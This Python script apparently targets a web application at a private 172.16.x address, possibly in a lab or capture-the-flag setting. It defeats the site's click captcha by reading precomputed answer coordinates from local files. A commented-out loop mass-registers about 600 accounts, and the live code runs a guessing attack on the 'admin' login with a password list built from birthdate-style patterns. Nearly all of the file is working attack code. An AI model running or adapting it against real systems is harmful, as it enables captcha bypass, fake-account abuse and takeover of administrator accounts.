import requests
import re
import random

captcha_pattern = '<canvas id="vtt_captcha" width="680" height="460" rel="(.*?)"></canvas>'


def get_answer(uuid):
    answer = {}
    with open('./ans/ans{}.txt'.format(uuid), 'r', encoding='utf8') as f:
        for line in f.readlines():
            if line != '\n':
                ans = line.strip().split('=')
                answer[ans[0].strip()] = ans[1].strip()
    x = random.randint(int(float(answer['ans_pos_x_1'])),
                       int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
    y = random.randint(int(float(answer['ans_pos_y_1'])),
                       int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
    return x, y


#
# for i in range(1000, 1600):
#     try:
#         s = requests.session()
#         r1 = s.get('http://172.16.1.110/register')
#         captcha_uuid = re.search(captcha_pattern, r1.text).group(1)
#         username = f'sysugain{i}'
#         password = '123456'
#         mail = 'sysu@sysu.com'
#         invite_user = 'sysutest'
#         x, y = get_answer(captcha_uuid)
#         r2 = s.post('http://172.16.1.110/register', data={
#             'username': username,
#             'password': password,
#             'password_confirm': password,
#             'mail': mail,
#             'invite_user': invite_user,
#             'captcha_x': x,
#             'captcha_y': y
#         })
#         print(r2.content.decode('utf-8'))
#     except Exception:
#         pass


psw = [
    19960201,
    19950201,
    199621,
    199521,
    '02011996',
    '02011995',
    211996,
    211995,
    960201,
    950201,
    30347358510201,
    3034735851960201,
    3034735851950201,
    'admin19960201',
    'admin19950201',
    'admin0201',
    'admin21',
]

for p in psw:
    s = requests.session()
    r1 = s.get('http://172.16.1.110/login')
    captcha_uuid = re.search(captcha_pattern, r1.text).group(1)
    username = 'admin'
    password = p
    x, y = get_answer(captcha_uuid)
    r2 = s.post('http://172.16.1.110/login', data={
        'username': username,
        'password': password,
        'captcha_x': x,
        'captcha_y': y
    })
    if '错误' not in r2.content.decode('utf8'):
        print(p)
